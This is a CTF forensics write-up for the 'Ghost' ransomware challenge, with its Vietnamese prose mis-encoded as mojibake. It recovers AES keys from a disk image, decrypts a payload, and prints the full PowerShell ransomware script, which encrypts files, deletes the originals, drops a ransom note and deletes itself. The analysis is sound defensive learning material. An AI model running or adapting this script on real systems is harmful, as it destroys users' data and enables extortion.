---
layout: post
title: "Ghost - Ransomware Forensics Challenge"
date: 2025-12-02
categories: [CTF, Forensics]
tags: [autopsy, ransomware, aes, encryption, powershell, l3ak ctf]
---

# Ghost

**Difficulty:** Medium
**Category:** Endpoint  
**Tools:** Autopsy

---
ƒê√¢y l√† m·ªôt challenge forensics trong l3ak ctf. ƒê·ªÅ cho ta m·ªôt file disk image.
## üîç Initial Analysis

S·ª≠ d·ª•ng **Autopsy** ƒë·ªÉ ph√¢n t√≠ch disk image.

![Autopsy Overview](../assets/img/posts/Ghost/image.png)

Ta th·∫•y c√≥ m·ªôt v√†i file ƒë√°ng ch√∫ √Ω trong h·ªá th·ªëng.

![Suspicious Files](../assets/img/posts/Ghost/image%201.png)

### üìÑ Ransom Note

N·ªôi dung file `ransom_note.txt`:

```
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
```

C√≥ v·∫ª nh∆∞ n·ªôi dung c·ªßa ransomware script v·∫´n c√≤n tr√™n disk image.

---

## üîì Recovering the Encryption Script

![Recovered Script Location](../assets/img/posts/Ghost/image%202.png)

![PowerShell Script Content](../assets/img/posts/Ghost/image%203.png)

File `.ps1` ch·ª©a th√¥ng tin v·ªÅ encryption parameters:
- **Key:** `0123456789abcdef`
- **IV:** `abcdef9876543210`
- **Mode:** CBC
- **Padding:** PKCS7

---

## üîê Decrypting payload.enc

Ta ti·∫øn h√†nh decrypt file `payload.enc` v·ªõi th√¥ng tin ƒë√£ thu th·∫≠p ƒë∆∞·ª£c.

```python
from Crypto.Cipher import AES
import base64

key = b'0123456789abcdef'
iv = b'abcdef9876543210'

with open('payload.enc', 'r') as pl:
    data = pl.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
base64_data = base64.b64decode(data)
plaintext = cipher.decrypt(base64_data)

# Remove PKCS7 padding
pad_len = plaintext[-1]
plaintext = plaintext[:-pad_len]

print(plaintext.decode("utf-8", errors="ignore"))
```

### üìã Decrypted Script Output

```powershell
‚îå‚îÄ‚îÄ(nqghuy„âøkali)-[/mnt/e/CTF/forensics/Ghost]
‚îî‚îÄ$ python3 decrypt_script.py
$key = [System.Text.Encoding]::UTF8.GetBytes("m4yb3w3d0nt3x1st")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("l1f31sf0rl1v1ng!")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

# Load plaintext flag from C:\ (never written to L:\ in plaintext)
$flag = Get-Content "C:\Users\Blue\Desktop\StageRansomware\flag.txt" -Raw
$encryptor = $AES.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($flag)
$cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes("L:\flag.enc", $cipher)

# Encrypt other files staged in D:\ (or L:\ if you're using L:\ now)
$files = Get-ChildItem "L:\" -File | Where-Object {
    $_.Name -notin @("ransom.ps1", "ransom_note.txt", "flag.enc", "payload.enc", "loader.ps1")
}

foreach ($file in $files) {
    $plaintext = Get-Content $file.FullName -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes("L:\$($file.BaseName).enc", $cipher)
    Remove-Item $file.FullName
}

# Write ransom note
$ransomNote = @"
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
"@
Set-Content "L:\ransom_note.txt" $ransomNote -Encoding UTF8

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```

---

## üö© Decrypting the Flag

![Flag File](../assets/img/posts/Ghost/image%204.png)

V·ªõi **key** v√† **IV** m·ªõi t·ª´ script, ta ti·∫øn h√†nh decrypt `flag.enc`.

```python
from Crypto.Cipher import AES

key = b'm4yb3w3d0nt3x1st'
iv = b'l1f31sf0rl1v1ng!'

with open('flag.enc', 'rb') as pl:
    data = pl.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(data)

# Remove PKCS7 padding
pad_len = plaintext[-1]
plaintext = plaintext[:-pad_len]

print(plaintext.decode("utf-8", errors="ignore"))
```

**Flag:** `[Your flag here]`

---

## üéØ Key Takeaways

- **Forensic analysis** v·ªõi Autopsy c√≥ th·ªÉ recover deleted/hidden files
- **Ransomware scripts** th∆∞·ªùng ƒë·ªÉ l·∫°i artifacts tr√™n disk
- **Multi-stage encryption** ƒë√≤i h·ªèi ph√¢n t√≠ch t·ª´ng layer
- **PKCS7 padding** c·∫ßn ƒë∆∞·ª£c x·ª≠ l√Ω khi decrypt AES-CBC

---

*Sometimes the ghost leaves traces... üëª*